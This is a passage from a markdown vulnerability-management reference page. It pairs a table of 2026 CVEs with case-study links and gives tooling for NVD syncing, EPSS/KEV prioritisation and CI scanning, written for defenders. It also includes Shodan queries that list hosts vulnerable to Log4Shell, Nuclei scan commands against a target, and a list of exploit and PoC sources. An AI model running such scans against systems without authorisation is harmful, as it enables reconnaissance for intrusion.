| [CVE-2026-109619](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-109619) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [PHP2Shell and the October 2026 Attack Wave: A Case Study](/case-studies/PHP2SHELL_OCTOBER_2026.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/slides/plans/PHP_8_4_27_CVES.md) |
| [CVE-2026-110264](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-110264) | [GitLab, CVE-2026-97229: Lab-Verified Exposure and Fix](/case-studies/GITLAB_CVE_2026_97229.md), [Case Studies](/case-studies/README.md), [Slide plan: GitLab, CVE-2026-97229: Lab-Verified Exposure and Fix](/case-studies/slides/plans/GITLAB_CVE_2026_97229.md) |
| [CVE-2026-110447](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-110447) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Collabora Built-in CODE Server (richdocumentscode), CVE-2026-110447: Lab-Verified Exposure and Fix](/case-studies/NEXTCLOUD_RICHDOCUMENTS_CVE_2026_110447.md), [Case Studies](/case-studies/README.md), [Slide plan: Collabora Built-in CODE Server (richdocumentscode), CVE-2026-110447: Lab-Verified Exposure and Fix](/case-studies/slides/plans/NEXTCLOUD_RICHDOCUMENTS_CVE_2026_110447.md) |
| [CVE-2026-110936](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-110936) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Slide plan: Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/slides/plans/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2026-111357](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-111357) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/slides/plans/IVANTI_CONNECT_SECURE_2026.md) |
| [CVE-2026-111497](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-111497) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Node.js, CVE-2026-111497: Version Check and Fix in the Lab](/case-studies/NODEJS_CVE_2026_111497.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md), [Slide plan: Node.js, CVE-2026-111497: Version Check and Fix in the Lab](/case-studies/slides/plans/NODEJS_CVE_2026_111497.md) |
| [CVE-2026-111943](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-111943) | [The eMudhra Certificate Authority Key Compromise: A 2026 Case Study](/case-studies/EMUDHRA_CA_COMPROMISE_2026.md), [Slide plan: The eMudhra Certificate Authority Key Compromise: A 2026 Case Study](/case-studies/slides/plans/EMUDHRA_CA_COMPROMISE_2026.md) |
| [CVE-2026-115560](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-115560) | [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md) |
| [CVE-2026-118527](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-118527) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/slides/plans/IVANTI_CONNECT_SECURE_2026.md) |
| [CVE-2026-118539](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-118539) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md) |
| [CVE-2026-119977](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-119977) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Case Studies](/case-studies/README.md) |

<!-- hub-links:end -->

---

## 10. CVE Automation & Tooling

### NVD API Python Client with SQLite Cache

    import requests, time, sqlite3, json
    from datetime import datetime, timedelta

    class NVDClient:
        BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"

        def __init__(self, api_key=None, db_path="nvd.db"):
            self.headers = {"apiKey": api_key} if api_key else {}
            self.delay = 0.6 if api_key else 6.0
            self.db = sqlite3.connect(db_path)
            self.db.execute(
                "CREATE TABLE IF NOT EXISTS cves "
                "(id TEXT PRIMARY KEY, data JSON, score REAL, severity TEXT, "
                "published TEXT, modified TEXT)"
            )

        def _req(self, params):
            time.sleep(self.delay)
            return requests.get(self.BASE, params=params,
                                headers=self.headers, timeout=30).json()

        def sync(self, hours=24):
            end = datetime.utcnow()
            start = end - timedelta(hours=hours)
            params = {
                "lastModStartDate": start.strftime("%Y-%m-%dT%H:%M:%S.000"),
                "lastModEndDate":   end.strftime("%Y-%m-%dT%H:%M:%S.000"),
                "resultsPerPage": 2000
            }
            count = 0
            while True:
                params["startIndex"] = count
                data = self._req(params)
                for item in data.get("vulnerabilities", []):
                    cve = item["cve"]
                    v31 = cve.get("metrics", {}).get("cvssMetricV31", [{}])[0].get("cvssData", {})
                    self.db.execute(
                        "INSERT OR REPLACE INTO cves VALUES (?,?,?,?,?,?)",
                        (cve["id"], json.dumps(cve), v31.get("baseScore"),
                         v31.get("baseSeverity"), cve.get("published"), cve.get("lastModified"))
                    )
                    count += 1
                self.db.commit()
                if count >= data.get("totalResults", 0):
                    break
            return count

        def critical_cves(self):
            return self.db.execute(
                "SELECT id, score FROM cves WHERE severity='CRITICAL' ORDER BY score DESC"
            ).fetchall()

### EPSS + KEV Combined Pipeline

    import requests

    def enrich_cves(cve_ids: list) -> list:
        enriched = {cid: {"cve_id": cid, "epss": 0.0, "pct": 0.0,
                          "in_kev": False, "kev_due": ""} for cid in cve_ids}

        # EPSS
        for i in range(0, len(cve_ids), 100):
            batch = ",".join(cve_ids[i:i+100])
            r = requests.get(f"https://api.first.org/data/v1/epss?cve={batch}")
            for e in r.json().get("data", []):
                if e["cve"] in enriched:
                    enriched[e["cve"]]["epss"] = float(e["epss"])
                    enriched[e["cve"]]["pct"] = float(e["percentile"])

        # KEV
        kev = requests.get(
            "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
        ).json()
        for v in kev["vulnerabilities"]:
            if v["cveID"] in enriched:
                enriched[v["cveID"]]["in_kev"] = True
                enriched[v["cveID"]]["kev_due"] = v.get("dueDate", "")
                enriched[v["cveID"]]["ransomware"] = v.get("knownRansomwareUse") == "Known"

        def tier(e):
            if e["in_kev"] or e["epss"] > 0.70: return "T1-Emergency"
            if e["epss"] > 0.10: return "T2-Critical"
            if e["epss"] > 0.01: return "T3-High"
            return "T4-Normal"

        result = list(enriched.values())
        result.sort(key=lambda x: (x["in_kev"], x["epss"]), reverse=True)
        for e in result:
            e["tier"] = tier(e)
        return result

### Vulnerability Intelligence Pipeline Architecture

    [NVD API] [EPSS API] [KEV Feed] [OSV] [Vendor RSS]
         |         |          |       |         |
         +---------+----------+-------+---------+
                              |
               [Normalization Layer (CVE as key)]
                              |
               [Enrichment DB: CVSS+EPSS+KEV+ExploitDB+ADP]
                              |
               [Prioritization Engine (tier assignment)]
                              |
          +------------------+-------------------+
          |                  |                   |
    [SIEM/SOAR]      [Ticket System]      [Dashboard/API]

### Open Source VM Platforms

DefectDojo (github.com/DefectDojo/django-DefectDojo):

    # Import scanner results (100+ formats supported)
    curl -X POST https://defectdojo.example.com/api/v2/import-scan/       -H "Authorization: Token $TOKEN"       -F "scan_type=Trivy Scan" -F "file=@trivy.json"       -F "product_name=My App" -F "engagement_name=Sprint-42"

Dependency-Track (github.com/DependencyTrack/dependency-track):

    # Upload SBOM for continuous tracking
    curl -X PUT https://dtrack.example.com/api/v1/bom       -H "X-Api-Key: $DT_KEY"       -F "projectName=My App" -F "projectVersion=2.1.0"       -F "autoCreate=true" -F "bom=@sbom.cdx.json"

### CI/CD Security Scanning

    # GitHub Actions -- vulnerability gate
    - name: Trivy scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: myapp:${{ github.sha }}
        format: sarif
        output: trivy-results.sarif
        severity: CRITICAL,HIGH
        exit-code: '1'
        ignore-unfixed: true

    - name: Upload to GitHub Security tab
      uses: github/codeql-action/upload-sarif@v3
      if: always()
      with:
        sarif_file: trivy-results.sarif

### Threat Intelligence Tools

Shodan CVE search:

    shodan count "vuln:CVE-2021-44228"
    shodan search "vuln:CVE-2021-44228" --fields ip_str,port,org,country_code

Nuclei CVE templates:

    nuclei -t cves/ -u https://target.com -severity critical,high -o results.json
    nuclei -t cves/2021/CVE-2021-44228.yaml -u https://target.com
    nuclei -update-templates

### CISA ADP Enrichment

CISA-ADP publishes machine-readable enrichment in CVE JSON 5.0 `containers.adp` array,
often 24-72 hours before NVD updates. Key signals:

    "adp": [{
      "providerMetadata": {"shortName": "CISA-ADP"},
      "metrics": [{"other": {"type": "ssvc", "content": {
        "options": [
          {"Exploitation": "active"},   // none | poc | active
          {"Automatable": "yes"},       // yes | no (wormability)
          {"Technical Impact": "total"} // partial | total
        ]
      }}}]
    }]

`Exploitation: active` in CISA-ADP data is an early warning signal equivalent to
KEV membership. It often appears before formal KEV catalog addition.

---

## Key External Resources

Curated vulnerability databases, exploit intelligence, and PoC sources for CVE research and enrichment.

| Resource | URL |
|---|---|
| CVE Details | cvedetails.com |
| OpenCVE | https://www.opencve.io/ |
| GitHub Advisory Database | https://github.com/advisories |
| VulnCheck | https://vulncheck.com/ |
| Vulners | https://vulners.com/ |
| VulDB | vuldb.com |
| Snyk Vulnerability DB | https://security.snyk.io/ |
| Mend Vulnerability DB | https://www.mend.io/vulnerability-database/ |
| Rapid7 Vuln & Exploit DB | https://www.rapid7.com/db/ |
| Tenable CVE Database | https://www.tenable.com/cve |
| cvecrowd (trending CVEs) | https://cvecrowd.com/ |
| Metasploit Modules (Rapid7 DB) | https://www.rapid7.com/db/?type=metasploit |
| Nuclei Templates | https://github.com/projectdiscovery/nuclei-templates |
| PoC-in-GitHub (nomi-sec) | https://github.com/nomi-sec/PoC-in-GitHub |
| Trickest CVE → PoC | https://github.com/trickest/cve |
| Packet Storm | https://packetstormsecurity.com/ |
| Sploitus | https://sploitus.com/ |
| VulnCheck XDB (exploits) | https://vulncheck.com/xdb |

---

*Last updated: 2026-05-07 | Covers CVE program architecture, CVSS v3.1/v4.0,
EPSS, CISA KEV, vulnerability databases, research methodology, patch management,
notable case studies, and automation tooling.*

<!-- related:start (written by scripts/build_crosslinks.py; do not edit) -->

## Related pages

- Domain: [GRC and security program](/hubs/grc-and-security-program.md)
- [CWE Weakness Reference](/CWE_REFERENCE.md)
- [CTEM Reference](/CTEM_REFERENCE.md)
- [Fuzzing & Vulnerability Research](/FUZZING_VULNERABILITY_RESEARCH.md)
- [Exploit Development Reference](/EXPLOIT_DEVELOPMENT_REFERENCE.md)
- [Vulnerability Management](/VULNERABILITY_MANAGEMENT_REFERENCE.md)

<!-- related:end -->
